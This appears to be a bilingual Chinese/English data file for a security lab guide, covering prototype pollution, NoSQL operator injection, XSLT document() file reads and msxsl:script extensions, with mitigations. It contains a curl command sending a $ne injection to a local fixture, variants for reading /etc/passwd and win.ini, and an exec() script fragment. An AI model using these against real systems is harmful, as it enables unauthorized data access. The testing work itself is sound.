analysis.zh: marker 仅在响应 JSON 中出现不代表原型污染；必须证明它来自新对象的继承链。即使污染原语成立，也不能直接写成 RCE，除非另有确定版本、调用路径和无害 Gadget 证据。
analysis.en: A marker appearing only in response JSON does not prove prototype pollution; it must be inherited by a fresh object. Even when the primitive is confirmed, it must not be labeled RCE without separate evidence for the exact version, call path, and a harmless gadget effect.

opsecTips.zh: 每次 marker 请求后销毁 Worker，避免污染状态影响后续测试或其他开发任务。
opsecTips.en: Destroy the worker after each marker request so polluted state cannot affect later tests or other development work.

opsecTips.zh: 禁止使用 child_process、环境变量覆盖、文件读取或外连 Gadget；证据只使用合成字符串。
opsecTips.en: Do not use child_process, environment overrides, file reads, or outbound gadgets; use synthetic strings as the only evidence.

name.zh: 客户端原型链污染到 DOM Sink 边界
name.en: Client-Side Prototype Pollution to DOM-Sink Boundary

description.zh: 使用本地 URL marker 区分查询解析器污染、配置继承和 DOM Sink 实际解释，并通过真实 Chromium 回归确认是否形成脚本执行边界。
description.en: Use local URL markers to distinguish query-parser pollution, inherited configuration, and actual DOM-sink interpretation, then confirm any script-execution boundary with real Chromium regression.

subCategory.zh: 污染利用链到 RCE 与客户端

overview.zh: 客户端原型链污染到 DOM Sink 边界针对 URL 或消息解析器把危险键写入共享原型并影响 DOM 的场景。验证基础 URL 污染、无脚本 innerHTML marker 与 Sanitizer 配置 marker 三类边界。
overview.en: The client-side prototype-pollution-to-DOM-sink boundary targets URL or message parsers writing dangerous keys to the shared prototype and affecting the DOM. It validates three boundaries: basic URL pollution, script-free innerHTML markers, and Sanitizer configuration markers.

vulnerability.zh: 仅看到 ({}).marker 或 URL 中存在 __proto__ 不能证明 XSS；确认污染源需要全新对象继承 marker，确认 DOM 影响需要 marker 到达特定 Sink，确认 XSS 还需要浏览器实际解释脚本或事件属性。
vulnerability.en: Seeing ({}).marker or __proto__ in a URL does not prove XSS; confirming the pollution source requires a fresh object inheriting the marker, confirming DOM impact requires the marker reaching a specific sink, and confirming XSS further requires the browser to actually interpret script or event attributes.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 __proto__[labMarker] 并在真实 Chromium 检查全新对象是否继承，确认污染源；第 2 步提交仅含 span 的 HTML 观察是否进入 DOM Sink；第 3 步 ALLOWED_ATTR marker 区分配置继承与脚本解释。被过滤时用编码与嵌套路径 marker，三级证据逐级确认。
exploitation.en: Use payloads in list order: step 1 submits __proto__[labMarker] and checks in a real Chromium whether a fresh object inherits it, confirming the pollution source; step 2 submits span-only HTML to observe DOM-sink entry; step 3's ALLOWED_ATTR marker separates configuration inheritance from script interpretation. Use encoded and nested-path markers when filtered, confirming evidence level by level.

mitigation.zh: 解析器拒绝 __proto__、prototype 与 constructor，任意键值用 Map 或 Object.create(null)；DOM 写入用 textContent 或严格 Sanitizer。修复后重放第 1-3 步 marker，确认原型无污染。
mitigation.en: Parsers reject __proto__, prototype, and constructor, storing arbitrary key-values in Map or Object.create(null); write DOM via textContent or a strict Sanitizer. After the fix, replay the step 1-3 markers and confirm clean prototypes.

description.zh: 在全新浏览器上下文中记录普通对象、查询解析结果和 DOM 的无 marker 状态。
description.en: Record marker-free ordinary objects, parsed query output, and DOM state in a fresh browser context.

description.zh: 提交单一危险键路径，并要求后续全新对象继承唯一 marker，而不是只观察请求回显。
description.en: Submit one dangerous-key path and require a later fresh object to inherit the unique marker rather than relying on request reflection.

description.zh: 跟踪继承属性是否进入 innerHTML 或 Sanitizer 配置，并记录最终 DOM 而非假设 Gadget。
description.en: Trace whether inherited properties enter innerHTML or sanitizer configuration and record the final DOM instead of assuming a gadget.

title.zh: 修复后运行 Chromium 回归

description.zh: 修复后重放全部路径，要求原型保持干净、marker 不进入 Sink 且无 CSP violation。
description.en: Replay every path after remediation and require a clean prototype, no marker reaching the sink, and no CSP violation.

prerequisites.zh: 使用 127.0.0.1 浏览器 Fixture，并在每个用例后重新加载独立页面和清理 Object.prototype marker。
prerequisites.en: Use the 127.0.0.1 browser fixture, reloading an isolated page and clearing Object.prototype markers after every case.

prerequisites.zh: 页面通过 textContent、属性快照和 CSP 报告记录证据，不访问 Cookie、存储、网络凭据或真实业务 DOM。
prerequisites.en: Record evidence through textContent, attribute snapshots, and CSP reports without accessing cookies, storage, network credentials, or real business DOM.

analysis.zh: 结论应分为污染源、可观察 DOM 影响和脚本执行三级。只有浏览器实际解释了可执行上下文才能写为 XSS；marker 被继承或以文本形式出现在 DOM 中不应升级漏洞影响。
analysis.en: Classify conclusions as pollution source, observable DOM impact, and script execution. Label XSS only when the browser actually interprets an executable context; an inherited marker or text appearing in DOM must not inflate impact.

opsecTips.zh: Payload 只使用 span 与 data-lab-marker，不包含 onerror、script、javascript URL、Cookie 或网络请求。
opsecTips.en: Payloads use only span and data-lab-marker, with no onerror, script, javascript URLs, cookies, or network requests.

opsecTips.zh: 每个用例关闭浏览器上下文并删除 Object.prototype marker，避免污染状态泄漏到其他测试。
opsecTips.en: Close the browser context and delete Object.prototype markers after each case so polluted state cannot leak into other tests.

name.zh: 原型链污染与 NoSQL 查询构造边界
name.en: Prototype Pollution and NoSQL Query-Construction Boundary

description.zh: 使用合成用户和 operator marker 验证 JSON 或表单输入是否被当作 MongoDB 查询对象，以及原型属性是否进入查询构造。
description.en: Use a synthetic user and operator markers to validate whether JSON or form input becomes a MongoDB query object and whether inherited properties enter query construction.

subCategory.zh: 替代语法与查询对象污染

overview.zh: 原型链污染与 NoSQL 查询构造边界针对 JSON 或表单输入被当作 MongoDB 查询对象的场景：标量字段可变成操作符对象。验证 $ne 操作符拒绝与 __proto__ 查询 marker 两类边界，以 matched_count 为证据。
overview.en: The prototype-pollution and NoSQL query-construction boundary targets JSON or form input treated as MongoDB query objects, where scalar fields become operator objects. It validates two boundaries—operator rejection for $ne and __proto__ query markers—using matched_count as evidence.

vulnerability.zh: 如果 API 接受任意 JSON 对象并直接传给 find、findOne 或 aggregate，$ne、$regex 等操作符可能改变查询语义；如果构造器遍历继承键，原型 marker 也可能进入查询。确认需要保存最终查询 AST 与结果差分。
vulnerability.en: If the API accepts arbitrary JSON objects passed directly to find, findOne, or aggregate, operators like $ne and $regex can change query semantics; if constructors traverse inherited keys, prototype markers can enter queries too. Confirmation requires saving the final query AST and result differentials.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步把合成 status 字段改为 $ne 对象提交 /lab/nosql/filter，命中判据为查询前被拒绝且无匹配结果；再用第 2 步提交 __proto__.filterMarker 并断言原型值为空、正常合成用户查询仍返回单条结果；表单入口用 WAF 绕过区的表单 Operator 拒绝样例复测。每步保存请求 ID、matched_count 与查询日志，形成语义差分证据。
exploitation.en: Use payloads in list order: flip the synthetic status field to a $ne object and submit to /lab/nosql/filter per step 1—a hit is rejection before querying with zero matches; then submit __proto__.filterMarker per step 2, asserting the prototype value is empty while the normal synthetic-user query still returns one result; retest the form entry with the form-operator rejection samples in the WAF-bypass section. Save request ID, matched_count, and query logs each step as differential evidence of semantic change.

mitigation.zh: 通过 Schema 将用户名字段强制为标量并拒绝未知或美元前缀键，不把请求对象直接传给数据库驱动；使用显式字段构造查询、关闭服务端 JavaScript、拒绝危险原型键并只遍历 own properties。修复后重放第 1、2 步样例，覆盖 JSON 与表单两类解析器的回归。
mitigation.en: Force fields like username to scalars via schema and reject unknown or dollar-prefixed keys; never pass request objects directly to the database driver; construct queries with explicit fields, disable server-side JavaScript, reject dangerous prototype keys, and traverse own properties only. After the fix, replay the step 1-2 samples, covering regression for both JSON and form parsers.

description.zh: 用合成 lab-user 字符串记录解析类型、查询 AST 和 matched_count=1 的正常结果。
description.en: Use the synthetic lab-user string to record parsed type, query AST, and normal matched_count=1.

description.zh: 把一个字段从字符串改为 $ne 对象，要求 Schema 在数据库调用前拒绝。
description.en: Change one field from a string to a $ne object and require schema rejection before any database call.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/nosql/filter" -H "Content-Type: application/json" -H "X-Request-ID: nosql-a1" --data '{"username":"lab-user","status":{"$ne":"disabled"},"marker":"NOSQL_OPERATOR_A1"}' | jq -e '.operator_rejected == true and .matched_count == 0'

description.zh: 提交 __proto__ marker 并检查最终查询 AST 与新对象，确认继承键没有进入查询。
description.en: Submit a __proto__ marker and inspect the final query AST plus a fresh object to ensure inherited keys never enter the query.

title.zh: 覆盖第二解析器并回归
title.en: Cover the second parser and regress

description.zh: 用表单括号语法重复操作符测试，修复后要求 JSON 和表单路径结果一致。
description.en: Repeat the operator test with form bracket syntax and require consistent JSON and form behavior after remediation.

prerequisites.zh: 使用 127.0.0.1 NoSQL Fixture，数据库只含一个合成 lab-user 文档且不签发 Token。
prerequisites.en: Use the 127.0.0.1 NoSQL fixture, whose database contains one synthetic lab-user document and never issues tokens.

prerequisites.zh: 服务端日志能够记录解析后的值类型、拒绝原因、最终查询 AST、matched_count 与 request_id。
prerequisites.en: Server logs record parsed value types, rejection reason, final query AST, matched_count, and request_id.

analysis.zh: 阳性需要异常输入改变最终查询 AST 或 matched_count，并能排除直接回显和测试数据差异。操作符被拒绝、原型 marker 为空或 matched_count=0 都是有效阻断，不能被描述为认证绕过。
analysis.en: A positive requires abnormal input to change the final query AST or matched_count while excluding reflection and fixture-data differences. Operator rejection, a null prototype marker, or matched_count=0 are effective blocking outcomes and must not be described as authentication bypass.

opsecTips.zh: 只查询合成 lab-user，不使用 admin、密码、Token、邮箱、真实集合或逐字符循环。
opsecTips.en: Query only the synthetic lab-user, with no admin identity, passwords, tokens, emails, real collections, or character-by-character loops.

opsecTips.zh: 每个请求限制五秒并保存 request_id；出现数据库错误激增、查询队列积压或非合成字段时立即停止。
opsecTips.en: Limit each request to five seconds and preserve request_id; stop on elevated database errors, query backlog, or any non-synthetic field.

name.zh: XSLT document() 文件读取边界

description.zh: 保留完整的五行 XSLT 1.0 样式表，验证服务端转换器是否允许 document() 解析外部文件资源。
description.en: Preserves the complete five-line XSLT 1.0 stylesheet to test whether a server-side transformer permits document() to resolve an external file resource.

overview.zh: XSLT document() 文件读取边界针对服务端转换器允许 document() 解析外部文件资源的场景：转换输出可能包含渲染主机文件。验证以完整 XSLT 1.0 样式表加载 marker.xml，确认 URI resolver 的访问范围。
overview.en: The XSLT document() file-read boundary targets server-side transformers allowing document() to resolve external file resources, where transform output may include renderer-host files. It loads marker.xml with a complete XSLT 1.0 stylesheet to confirm the URI resolver's access scope.

vulnerability.zh: 若应用执行不可信样式表且允许文件 URI 或相对路径越出资源根，转换输出可能包含渲染主机文件；路径出现在错误、函数被识别或 URI 打开失败均不等于内容读取。
vulnerability.en: If the application executes untrusted stylesheets and permits file URIs or relative paths beyond the resource root, transform output may include renderer-host files; paths appearing in errors, the function being recognized, or failed URI opens do not equal content reads.

exploitation.zh: 保留第 1 步的完整五行 XSLT 样式表结构，把 document() 参数改为沙箱内的 marker.xml 后提交到目标转换入口；命中判据为转换输出包含 marker.xml 的内容，证明处理器允许 document() 解析外部文件。记录转换器类型、base URI 与 resolver 行为；确认读取能力后按同一语法评估是否可越出资源根，切勿直接读取系统文件。
exploitation.en: Keep the complete five-line XSLT stylesheet structure from step 1, change the document() argument to an in-sandbox marker.xml, and submit to the target transform entry; a hit is transform output containing marker.xml content, proving the processor lets document() resolve external files. Record transformer type, base URI, and resolver behavior; once read capability is confirmed, evaluate escaping the resource root with the same syntax—never read system files directly.

mitigation.zh: 只允许签名或版本控制的固定样式表，启用安全处理并用拒绝外部 URI 的 resolver；转换进程使用最小只读资源根、无网络和低权限身份。修复后重放第 1 步样式表，确认 document() 外部引用被拒绝且正常转换可用。
mitigation.en: Allow only signed or version-controlled fixed stylesheets, enable secure processing, and use a resolver that rejects external URIs; run transforms with a minimal read-only resource root, no network, and low privilege. After the fix, replay the step-1 stylesheet and confirm external document() references are rejected while normal transforms work.

description.zh: 记录实现、版本、base URI、安全开关和常量转换基线。
description.en: Record implementation, version, base URI, security switches, and constant-transform baseline.

description.zh: 只替换 document() 参数，在隔离转换任务中运行一次。
description.en: Replace only the document() argument and run once in an isolated transform job.

description.zh: 匹配 resolver、文件读取、任务 token 和转换结果中的随机值。
description.en: Match resolver, file read, job token, and random value in transform output.

title.zh: 拒绝外部 URI 并回归

description.zh: 修复后普通固定 XSLT 输出不变，marker 在打开前被拒绝。
description.en: After remediation fixed ordinary XSLT output is unchanged and the marker is rejected before open.

prerequisites.zh: 用户可控完整样式表进入已识别的 XSLT 处理器，处理器版本、base URI、document() 和 URIResolver 策略已冻结。
prerequisites.en: A user-controlled complete stylesheet reaches an identified XSLT processor, with processor version, base URI, document(), and URIResolver policy frozen.

prerequisites.zh: 原 `/etc/passwd` 在运行前改为只含随机 XML marker 的沙箱文件，转换进程无其他宿主文件和网络权限。
prerequisites.en: Before execution, replace /etc/passwd with a sandbox XML marker containing only a random value and give the transformer no other host-file or network permission.

analysis.zh: 阳性必须同时有目标转换进程读取合法 marker.xml 和随机值进入输出。`select`、namespace URL、文件路径文本、解析成功或错误信息都是结构/诊断信号，不证明越界读取。
analysis.en: A positive requires both the target transformer reading valid marker.xml and its random value entering output. The select attribute, namespace URL, file-path text, parse success, or errors are structural or diagnostic signals and do not prove a boundary-crossing read.

opsecTips.zh: 只使用有效的小型 marker.xml，禁止系统文件、网络 URL、递归文档或大体积资源。
opsecTips.en: Use only a small valid marker.xml and prohibit system files, network URLs, recursive documents, or large resources.

opsecTips.zh: 一次性转换进程使用短超时和只读目录，完成后删除样式表、源 XML、marker、输出与 resolver 日志令牌。
opsecTips.en: Use a disposable transform process with a short timeout and read-only directory, then delete stylesheet, source XML, marker, output, and resolver-log tokens.

description.zh: 绝对路径读取绕过相对限制。判据：返回 passwd。
description.en: Absolute path read. Success: passwd returned.

description.zh: file URI 跨平台读取。判据：返回 win.ini。
description.en: file URI cross-platform read. Success: win.ini returned.

description.zh: 以外部实体替代 document()。判据：实体内容回显。
description.en: External entity instead of document(). Success: entity content echoed.

name.zh: XSLT msxsl:script 代码扩展片段

description.zh: 保留不可单独解析但内部连贯的 msxsl:script C# 与 user:exec() 片段，用于验证宿主 XSLT 引擎是否启用脚本扩展；实际测试必须嵌入有效样式表并改用无副作用标记函数。
description.en: Preserves the non-standalone but internally coherent msxsl:script C# and user:exec() fragment to test whether a host XSLT engine enables script extensions; validation must embed it in a valid stylesheet and replace the process call with a side-effect-free marker function.

overview.zh: XSLT msxsl:script 代码扩展片段针对宿主 XSLT 引擎是否启用脚本扩展的验证场景：msxsl:script 可编译脚本并经命名空间函数调用。验证使用嵌入有效样式表的 marker 函数替代进程启动语句。
overview.en: The XSLT msxsl:script code-extension fragment targets validating whether the host XSLT engine enables script extensions: msxsl:script compiles scripts callable via namespace functions. Validation embeds the fragment in a valid stylesheet with a marker function replacing process-start statements.

vulnerability.zh: 若应用让不可信样式表进入启用脚本的转换器，脚本扩展可越过纯数据转换边界；样式表可解析、脚本被编译或错误中出现 Process 均不等于函数执行。
vulnerability.en: If the application lets untrusted stylesheets into a script-enabled transformer, script extensions cross the pure data-transformation boundary; a parseable stylesheet, compiled script, or Process appearing in errors does not equal function execution.

exploitation.zh: 原片段不是完整 XML，不能直接提交：先把它嵌入含模板与闭合根元素的有效样式表，并按第 1 步要求删除进程启动语句、改为返回一次性 marker 的函数；再提交到目标转换入口。命中判据为转换输出包含 marker 字符串，证明脚本扩展被启用且函数被调用。记录引擎类型与编译日志；Process 相关验证仅在明确授权的隔离环境进行。
exploitation.en: The original fragment is not complete XML and cannot be submitted directly: first embed it in a valid stylesheet with a template and closing root, replacing process-start statements with a one-shot marker function as step 1 requires; then submit to the target transform entry. A hit is the marker string in transform output, proving script extensions are enabled and the function invoked. Record engine type and compile logs; Process-related checks only in explicitly authorized isolated environments.

mitigation.zh: 禁止用户提供 XSLT，或使用禁用脚本和 document() 的固定受信样式表；隔离转换身份并限制文件、进程和网络权限。修复后重放第 1 步构造的脚本样式表，确认 msxsl:script 被拒绝且正常转换可用。
mitigation.en: Forbid user-supplied XSLT, or use fixed trusted stylesheets with scripting and document() disabled; isolate the transform identity and restrict file, process, and network permissions. After the fix, replay the step-1 script stylesheet and confirm msxsl:script is rejected while normal transforms work.

title.zh: 修复结构并建立禁用基线
title.en: Complete structure and establish a disabled baseline

description.zh: 只补齐必需 XSLT 结构，把原进程代码替换为常量 marker 函数。
description.en: Add only required XSLT structure and replace the source process code with a constant marker function.

title.zh: 在两种脚本设置下转换
